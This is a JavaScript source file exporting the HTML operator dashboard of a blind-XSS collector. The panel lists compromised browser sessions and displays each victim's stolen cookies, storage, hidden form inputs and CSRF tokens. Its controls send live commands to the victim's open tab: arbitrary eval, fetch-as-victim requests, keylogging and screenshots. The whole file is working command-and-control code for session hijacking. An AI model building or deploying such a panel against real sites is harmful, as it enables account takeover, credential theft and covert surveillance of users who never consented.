// Operator dashboard, served from GET / (auth-gated by ?key=AUTH_KEY).
export const DASHBOARD = `<!doctype html><meta charset=utf-8><title>bxss</title>
<style>
 body{font:13px/1.4 ui-monospace,Menlo,monospace;margin:0;background:#0d1117;color:#c9d1d9}
 header{padding:8px 12px;background:#161b22;border-bottom:1px solid #30363d}
 #wrap{display:grid;grid-template-columns:320px 1fr;height:calc(100vh - 38px)}
 #list{overflow:auto;border-right:1px solid #30363d}
 .s{padding:8px 12px;border-bottom:1px solid #21262d;cursor:pointer}
 .s:hover{background:#161b22}.s b{color:#58a6ff}
 #detail{overflow:auto;padding:12px}
 pre{white-space:pre-wrap;word-break:break-all;background:#161b22;padding:8px;border-radius:4px;max-height:40vh;overflow:auto}
 h3{color:#7ee787;margin:14px 0 4px}
 input,button{font:inherit;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:4px 6px}
 button{cursor:pointer;background:#21262d}
 .cmd{display:flex;gap:6px;margin:8px 0}.cmd input{flex:1}
 .quick button{margin:2px}
</style>
<header>blind-xss-collector — <span id=count>0</span> sessions</header>
<div id=wrap><div id=list></div><div id=detail>select a session</div></div>
<script>
const key=new URLSearchParams(location.search).get('key')||'';
const q=p=>fetch(p+(p.includes('?')?'&':'?')+'key='+encodeURIComponent(key)).then(r=>r.json());
let cur=null;
async function refresh(){
  const ss=await q('/api/sessions');
  document.getElementById('count').textContent=ss.length;
  document.getElementById('list').innerHTML=ss.map(s=>
    '<div class=s onclick="open_('+"'"+s.sid+"'"+')"><b>'+esc(s.token)+'</b><br>'+esc(s.url||'')+'<br><small>'+new Date(s.last_seen).toLocaleString()+' · '+esc(s.ip||'')+'</small></div>').join('');
}
function esc(s){return String(s==null?'':s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
async function open_(sid){
  cur=sid;
  const [reps,cmds]=await Promise.all([q('/api/reports?sid='+sid),q('/api/cmdresults?sid='+sid)]);
  const r=reps[0]||{};
  document.getElementById('detail').innerHTML=
    '<h3>fired at</h3><pre>'+esc(r.url)+'\\n'+esc(r.title)+'</pre>'+
    '<h3>victim</h3><pre>'+esc(r.ip)+' — '+esc(r.ua)+'</pre>'+
    '<h3>cookies</h3><pre>'+esc(r.cookies)+'</pre>'+
    '<h3>storage</h3><pre>'+esc(r.storage)+'</pre>'+
    '<h3>forms / hidden inputs</h3><pre>'+esc(r.forms)+'</pre>'+
    '<h3>meta / csrf</h3><pre>'+esc(r.meta)+'</pre>'+
    '<div class=quick><h3>interactive (tab must still be open)</h3>'+
      '<button onclick="send(\\'dom\\')">dom</button>'+
      '<button onclick="send(\\'cookies\\')">cookies</button>'+
      '<button onclick="send(\\'storage\\')">storage</button>'+
      '<button onclick="send(\\'screenshot\\')">screenshot</button>'+
      '<button onclick="var u=prompt(\\'same-origin URL to fetch as victim\\');if(u)send(\\'fetch:\\'+u)">fetch-as-victim</button>'+
      '<button onclick="var s=prompt(\\'selector to keylog (blank=all)\\');send(\\'keylog:\\'+(s||\\'\\'))">keylog</button>'+
    '</div>'+
    '<div class=cmd><input id=ci placeholder="eval:document.domain  |  fetch:/admin  |  dom"><button onclick="send()">run</button></div>'+
    '<h3>command results</h3><pre id=res>'+cmds.map(c=>'['+c.status+'] '+esc(c.cmd)+'\\n'+esc(c.result||'(pending)')).join('\\n\\n')+'</pre>'+
    '<h3>DOM snapshot</h3><pre>'+esc(r.dom)+'</pre>';
}
async function send(cmd){
  cmd=cmd||document.getElementById('ci').value; if(!cmd||!cur)return;
  await fetch('/api/cmd?key='+encodeURIComponent(key),{method:'POST',body:JSON.stringify({sid:cur,cmd})});
  setTimeout(()=>open_(cur),1500);
}
refresh();setInterval(refresh,4000);
</script>`;
